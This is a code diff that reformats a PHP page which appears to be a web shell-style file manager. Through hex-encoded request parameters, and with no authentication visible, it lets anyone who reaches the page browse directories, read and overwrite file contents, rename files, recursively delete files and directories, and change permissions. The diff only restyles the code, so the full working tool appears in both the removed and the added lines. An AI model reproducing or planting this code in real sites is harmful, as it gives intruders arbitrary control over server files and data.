@@ -231,22 +231,28 @@ function myFunction() {
 </form>
 </div>
 <?php
-    $_POST['x'] = (isset($_POST['x'])) ? encrypt($_POST['x'],'de') : false;
-    $_POST['file'] = (isset($_POST['file'])) ? encrypt($_POST['file'],'de') : false;
-    $FILEPATH      = "http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], ' ', $_POST['file']);
-    function start(){
-        global $_POST,$_GET;
-    
-        $result['cwd'] = (isset($_GET['x'])) ? encrypt($_GET['x'],'de') : getcwd();
-        $result['currentpathen'] = (isset($_GET['x'])) ? $_GET['x'] : encrypt(getcwd(),'en');
-        $result['home'] = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
-    
-        return $result;
-    }
-    function actionChangename($file, $type) {
-    	switch ($type) {
-    		case 'dir':
-    			?>
+$_POST['x'] = isset($_POST['x']) ? encrypt($_POST['x'], 'de') : false;
+$_POST['file'] = isset($_POST['file']) ? encrypt($_POST['file'], 'de') : false;
+$FILEPATH =
+    "http://" .
+    $_SERVER['HTTP_HOST'] .
+    str_replace($_SERVER['DOCUMENT_ROOT'], ' ', $_POST['file']);
+function start()
+{
+    global $_POST, $_GET;
+
+    $result['cwd'] = isset($_GET['x']) ? encrypt($_GET['x'], 'de') : getcwd();
+    $result['currentpathen'] = isset($_GET['x'])
+        ? $_GET['x']
+        : encrypt(getcwd(), 'en');
+    $result['home'] =
+        'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
+
+    return $result;
+}
+function actionChangename($file, $type)
+{
+    switch ($type) { case 'dir': ?>
     			<tr>
     				<td colspan="3" class="header-action">
     					CHANGE NAME
@@ -254,7 +260,7 @@ function myFunction() {
     			</tr>
     			<tr>
     				<td>
-    					<?= @$alert; ?>	
+    					<?= @$alert ?>	
     				</td>
     			</tr>
     			<tr>
@@ -287,13 +293,19 @@ function myFunction() {
             	<form method="post">
             		<td colspan="3">
             			<button onclick="window.location.href='?x=<?= $cwd ?>'">files</button>
-                		<button onclick="window.location.href='?x=<?= encrypt($file, 'en') ?>'">open</button>
+                		<button onclick="window.location.href='?x=<?= encrypt(
+                      $file,
+                      'en'
+                  ) ?>'">open</button>
                 		<button name="action" value="delete">delete</button>
                 		<button name="action" value="rename" disabled>rename</button>
                 		<button name="action" value="chmod">chmod</button>
                 		<button>donwload</button>
                 	</td>
-                	<input type="hidden" name="file" value="<?= encrypt($file, 'en') ?>">
+                	<input type="hidden" name="file" value="<?= encrypt(
+                     $file,
+                     'en'
+                 ) ?>">
                 </form>
             </tr>
             <form method="post">
@@ -306,15 +318,14 @@ function myFunction() {
             		<td colspan="3">
             			<input type="submit" name="submit">
             			<input type="hidden" name="action" value="changename">
-            			<input type="hidden" name="file" value="<?= encrypt($file, 'en') ?>">
+            			<input type="hidden" name="file" value="<?= encrypt(
+                   $file,
+                   'en'
+               ) ?>">
             		</td>
             	</tr>
             </form>
-            <?php
-    			break;
-    		
-    		case 'file':
-    			?>
+            <?php break;case 'file': ?>
     			<tr>
     				<td colspan="3" class="header-action">
     					CHANGE NAME
@@ -322,7 +333,7 @@ function myFunction() {
     			</tr>
     			<tr>
     				<td>
-    					<?= @$alert; ?>	
+    					<?= @$alert ?>	
     				</td>
     			</tr>
     			<tr>
@@ -362,7 +373,10 @@ function myFunction() {
                 		<button name="action" value="chmod">chmod</button>
                 		<button>donwload</button>
                 	</td>
-                	<input type="hidden" name="file" value="<?= encrypt($file, 'en') ?>">
+                	<input type="hidden" name="file" value="<?= encrypt(
+                     $file,
+                     'en'
+                 ) ?>">
                 </form>
             </tr>
             <form method="post">
@@ -375,183 +389,231 @@ function myFunction() {
             		<td colspan="3">
             			<input type="submit" name="submit">
             			<input type="hidden" name="action" value="changename">
-            			<input type="hidden" name="file" value="<?= encrypt($file, 'en') ?>">
+            			<input type="hidden" name="file" value="<?= encrypt(
+                   $file,
+                   'en'
+               ) ?>">
             		</td>
             	</tr>
             </form>
-            <?php
-            break;
-    	}
-    }
-    function getfiles($type) {
-        global $cwd;
-        $dir = scandir($cwd);
-        $result = array();
-        foreach ($dir as $key => $value) {
-            $current['fullname'] = $cwd . DIRECTORY_SEPARATOR . $value;
-            switch ($type) {
-                case 'dir':
-                    if (!is_dir($current['fullname']) || $value == '.' || $value == '..') continue 2;
-                    break;
-                case 'file':
-                    if (!is_file($current['fullname'])) continue 2;
-                    break;
-            }
-            $current['name'] = $value;
-            $current['link'] = encrypt($current['fullname'], 'en');
-            $current['size'] = (is_dir($current['fullname'])) ? @filetype($current['fullname']) : size($current['fullname']);
-            $current['time'] = ftime($current['fullname']);
-            $current['perm'] = w__($current['fullname'], perms($current['fullname']));
-            $result[] = $current;
-        } return $result;
-    }
-    function pwd() {
-        global $cwd;
-        $path = $cwd;
-        $path = str_replace('\\','/',$path);
-        $paths = explode('/',$path);
-        $result = '';
-        foreach ($paths as $id => $value) {
-            if($value == '' && $id == 0) {
-                $result .= '<a href="?x='.encrypt("/",'en').'">/</a>';
-                continue;
-            }
-            if($value == '') continue;
-            $result .= '<a href="?x=';
-            $linkpath = '';
-            for ($i=0; $i <= $id ; $i++) { 
-                $linkpath .= $paths[$i];
-                if($i != $id) $linkpath .= "/";
-            }
-            $result .= encrypt($linkpath,'en');
-            $result .=  '">'.$value.'</a>/';
-        } return $result;
-    }
-    function w__($filename, $perms) {
-        if (is_writable($filename)) {
-            return "<font color='green'>{$perms}</font>";
-        } else {
-            return "<font color='red'>{$perms}</font>";
-        }
-    }
-    function perms($filename) {
-        return substr(sprintf("%o", fileperms($filename)), -4);
-    }
-    function ftime($filename) {
-        return date("F d Y g:i:s", filemtime($filename));
-    }
-    function changeTime($filename) {
-        if (file_exists($filename)) filemtime($filename);
-    }
-    function size($filename) {
-        if (is_file($filename)) {
-            $filepath = $filename;
-            if (!realpath($filepath)) {
-                $filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
-            }
-            $filesize = filesize($filepath);
-            $array = array("TB","GB","MB","KB","B");
-            $total = count($array);
-            while ($total-- && $filesize > 1024) {
-                $filesize /= 1024;
-            } return round($filesize, 2) . " " . $array[$total];
-        } return false;
-    }
-    function changename($filename, $newname) {
-    	global $cwd;
-    	return rename($filename, $cwd .DIRECTORY_SEPARATOR. htmlspecialchars($newname));
-    }
-    function delete($filename) {
-        if (is_dir($filename)) {
-            $scdir = scandir($filename);
-            foreach ($scdir as $key => $value) {
-                if ($value != '.' && $value != '..') {
-                    if (is_dir($filename . DIRECTORY_SEPARATOR . $value)) {
-                        delete($filename . DIRECTORY_SEPARATOR . $value);
-                    } else {
-                        unlink($filename . DIRECTORY_SEPARATOR . $value);
-                    }
+            <?php break;}
+}
+function getfiles($type)
+{
+    global $cwd;
+    $dir = scandir($cwd);
+    $result = [];
+    foreach ($dir as $key => $value) {
+        $current['fullname'] = $cwd . DIRECTORY_SEPARATOR . $value;
+        switch ($type) {
+            case 'dir':
+                if (
+                    !is_dir($current['fullname']) ||
+                    $value == '.' ||
+                    $value == '..'
+                ) {
+                    continue 2;
                 }
-            } if (rmdir($filename)) {
-                return true;
-            } else {
-                return false;
-            }
-        } else {
-            if (unlink($filename)) {
-                return true;
-            } else {
-                return false;
-            }
-        }
-    }
-    function save($filename, $text, $mode = 'w') {
-        global $cwd;
-        if (substr($cwd, -1) === DIRECTORY_SEPARATOR) {
-            $handle = fopen($filename, $mode);
-            changeTime($cwd.DIRECTORY_SEPARATOR.$filename);
-            fwrite($handle, $text);
-            fclose($handle);
-        } else {
-            $handle = fopen($filename, $mode);
-            changeTime($cwd.DIRECTORY_SEPARATOR.$filename);
-            fwrite($handle, $text);
-            fclose($handle);
-        }
-    }
-    function getfileimg($file) {
-        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-        switch ($ext) {
-            case 'php':
-                print("https://image.flaticon.com/icons/png/128/337/337947.png");
                 break;
-            
-            default:
-                print("https://image.flaticon.com/icons/svg/833/833524.svg");
+            case 'file':
+                if (!is_file($current['fullname'])) {
+                    continue 2;
+                }
                 break;
         }
+        $current['name'] = $value;
+        $current['link'] = encrypt($current['fullname'], 'en');
+        $current['size'] = is_dir($current['fullname'])
+            ? @filetype($current['fullname'])
+            : size($current['fullname']);
+        $current['time'] = ftime($current['fullname']);
+        $current['perm'] = w__(
+            $current['fullname'],
+            perms($current['fullname'])
+        );
+        $result[] = $current;
     }
-    function encrypt($file, $type) {
-        if (function_exists("strlen") && function_exists("dechex") && function_exists("ord") && function_exists("chr") && function_exists("hexdec")) {
-            return ($type == 'en') ? hex($file) : unhex($file);
-        } 
+    return $result;
+}
+function pwd()
+{
+    global $cwd;
+    $path = $cwd;
+    $path = str_replace('\\', '/', $path);
+    $paths = explode('/', $path);
+    $result = '';
+    foreach ($paths as $id => $value) {
+        if ($value == '' && $id == 0) {
+            $result .= '<a href="?x=' . encrypt("/", 'en') . '">/</a>';
+            continue;
+        }
+        if ($value == '') {
+            continue;
+        }
+        $result .= '<a href="?x=';
+        $linkpath = '';
+        for ($i = 0; $i <= $id; $i++) {
+            $linkpath .= $paths[$i];
+            if ($i != $id) {
+                $linkpath .= "/";
+            }
+        }
+        $result .= encrypt($linkpath, 'en');
+        $result .= '">' . $value . '</a>/';
     }
-    function hex($string){
-        $hex = '';
-        for ($i=0; $i < strlen($string); $i++) {
-            $hex .= dechex(ord($string[$i]));
-        } return $hex;
+    return $result;
+}
+function w__($filename, $perms)
+{
+    if (is_writable($filename)) {
+        return "<font color='green'>{$perms}</font>";
+    } else {
+        return "<font color='red'>{$perms}</font>";
     }
-    function unhex($hex){
-        $string = '';
-        for ($i=0; $i < strlen($hex)-1; $i+=2) {
-            $string .= chr(hexdec($hex[$i].$hex[$i+1]));
-        } return $string;
+}
+function perms($filename)
+{
+    return substr(sprintf("%o", fileperms($filename)), -4);
+}
+function ftime($filename)
+{
+    return date("F d Y g:i:s", filemtime($filename));
+}
+function changeTime($filename)
+{
+    if (file_exists($filename)) {
+        filemtime($filename);
     }
+}
+function size($filename)
+{
+    if (is_file($filename)) {
+        $filepath = $filename;
+        if (!realpath($filepath)) {
+            $filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
+        }
+        $filesize = filesize($filepath);
+        $array = ["TB", "GB", "MB", "KB", "B"];
+        $total = count($array);
+        while ($total-- && $filesize > 1024) {
+            $filesize /= 1024;
+        }
+        return round($filesize, 2) . " " . $array[$total];
+    }
+    return false;
+}
+function changename($filename, $newname)
+{
+    global $cwd;
+    return rename(
+        $filename,
+        $cwd . DIRECTORY_SEPARATOR . htmlspecialchars($newname)
+    );
+}
+function delete($filename)
+{
+    if (is_dir($filename)) {
+        $scdir = scandir($filename);
+        foreach ($scdir as $key => $value) {
+            if ($value != '.' && $value != '..') {
+                if (is_dir($filename . DIRECTORY_SEPARATOR . $value)) {
+                    delete($filename . DIRECTORY_SEPARATOR . $value);
+                } else {
+                    unlink($filename . DIRECTORY_SEPARATOR . $value);
+                }
+            }
+        }
+        if (rmdir($filename)) {
+            return true;
+        } else {
+            return false;
+        }
+    } else {
+        if (unlink($filename)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+}
+function save($filename, $text, $mode = 'w')
+{
+    global $cwd;
+    if (substr($cwd, -1) === DIRECTORY_SEPARATOR) {
+        $handle = fopen($filename, $mode);
+        changeTime($cwd . DIRECTORY_SEPARATOR . $filename);
+        fwrite($handle, $text);
+        fclose($handle);
+    } else {
+        $handle = fopen($filename, $mode);
+        changeTime($cwd . DIRECTORY_SEPARATOR . $filename);
+        fwrite($handle, $text);
+        fclose($handle);
+    }
+}
+function getfileimg($file)
+{
+    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+    switch ($ext) {
+        case 'php':
+            print "https://image.flaticon.com/icons/png/128/337/337947.png";
+            break;
 
+        default:
+            print "https://image.flaticon.com/icons/svg/833/833524.svg";
+            break;
+    }
+}
+function encrypt($file, $type)
+{
+    if (
+        function_exists("strlen") &&
+        function_exists("dechex") &&
+        function_exists("ord") &&
+        function_exists("chr") &&
+        function_exists("hexdec")
+    ) {
+        return $type == 'en' ? hex($file) : unhex($file);
+    }
+}
+function hex($string)
+{
+    $hex = '';
+    for ($i = 0; $i < strlen($string); $i++) {
+        $hex .= dechex(ord($string[$i]));
+    }
+    return $hex;
+}
+function unhex($hex)
+{
+    $string = '';
+    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
+        $string .= chr(hexdec($hex[$i] . $hex[$i + 1]));
+    }
+    return $string;
+}
 ?>
 <table align="center" class="table">
 <br><br><br>
-<?php
-switch (@$_POST['action']) {
-	case 'delete':
-		delete($_POST['file']);
-		break;
-	case 'changename':
-		if (isset($_POST['submit'])) {
-			if (changename($_POST['file'], $_POST['newname'])) {
-				$alert = 'success';
-			} else {
-				$alert = 'failed';
-			}
-		}
-		if (is_dir($_POST['file'])) {
-			actionChangename($_POST['file'], 'dir');
-		} elseif (is_file($_POST['file'])) {
-			actionChangename($_POST['file'], 'file');
-		}
-		exit();
-		break;
+<?php switch (@$_POST['action']) {
+    case 'delete':
+        delete($_POST['file']);
+        break;
+    case 'changename':
+        if (isset($_POST['submit'])) {
+            if (changename($_POST['file'], $_POST['newname'])) {
+                $alert = 'success';
+            } else {
+                $alert = 'failed';
+            }
+        }
+        if (is_dir($_POST['file'])) {
+            actionChangename($_POST['file'], 'dir');
+        } elseif (is_file($_POST['file'])) {
+            actionChangename($_POST['file'], 'file');
+        }
+        exit();
+        break;
     case 'edit':
         if (isset($_POST['submit'])) {
             if (save($_POST['file'], $_POST['text'])) {
@@ -559,8 +621,7 @@ switch (@$_POST['action']) {
             } else {
                 $alert = "saved";
             }
-        }
-        ?>
+        } ?>
         <tr>
             <td colspan="3" class="header-action">
                 EDIT
@@ -609,29 +670,36 @@ switch (@$_POST['action']) {
                 <button name="action" value="chmod">chmod</button>
                 <button>donwload</button>
             </td>
-            <input type="hidden" name="file" value="<?= encrypt($_POST['file'], 'en') ?>">
+            <input type="hidden" name="file" value="<?= encrypt(
+                $_POST['file'],
+                'en'
+            ) ?>">
         </form>
         </tr>
         <form method="post">
             <tr>
                 <td colspan="3">
-                    <textarea name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
+                    <textarea name="text"><?= htmlspecialchars(
+                        file_get_contents($_POST['file'])
+                    ) ?></textarea>
                 </td>
             </tr>
             <tr>
                 <td colspan="3">
                     <input type="submit" name="submit">
                     <input type="hidden" name="action" value="edit">
-                    <input type="hidden" name="file" value="<?= encrypt($_POST['file'], 'en') ?>">
+                    <input type="hidden" name="file" value="<?= encrypt(
+                        $_POST['file'],
+                        'en'
+                    ) ?>">
                 </td>
             </tr>
         </form>
         <?php
         exit();
         break;
-}
 
-?>
+} ?>
 <tr>
 	<td colspan="6">
 		<center>
@@ -640,9 +708,7 @@ switch (@$_POST['action']) {
 	</td>
 </tr>
 <?php
-
-foreach (getfiles("dir") as $key => $value) {
-    ?>
+foreach (getfiles("dir") as $key => $value) { ?>
     <tr>
     	<td class="img">
     		<input type="checkbox" name="data[]" value="<?= $value['fullname'] ?>">
@@ -669,14 +735,15 @@ foreach (getfiles("dir") as $key => $value) {
                     <option value="changename">changename</option>
                     <option value="delete">delete</option>
                 </select>
-                <input type="hidden" name="file" value="<?= encrypt($value['fullname'], 'en') ?>">
+                <input type="hidden" name="file" value="<?= encrypt(
+                    $value['fullname'],
+                    'en'
+                ) ?>">
             </td>
         </form>
     </tr>
-    <?php
-}
-foreach (getfiles("file") as $key => $value) {
-    ?>
+    <?php }
+foreach (getfiles("file") as $key => $value) { ?>
     <tr>
     	<td class="img">
     		<input type="checkbox" name="data[]" value="<?= $value['fullname'] ?>">
@@ -704,12 +771,14 @@ foreach (getfiles("file") as $key => $value) {
                     <option value="changename">changename</option>
                     <option value="delete">delete</option>
                 </select>
-                <input type="hidden" name="file" value="<?= encrypt($value['fullname'], 'en') ?>">
+                <input type="hidden" name="file" value="<?= encrypt(
+                    $value['fullname'],
+                    'en'
+                ) ?>">
             </td>
         </form>
     </tr>
-    <?php
-}
+    <?php }
 ?>
 <div class="navbar-bottom">
 	<form method="post">
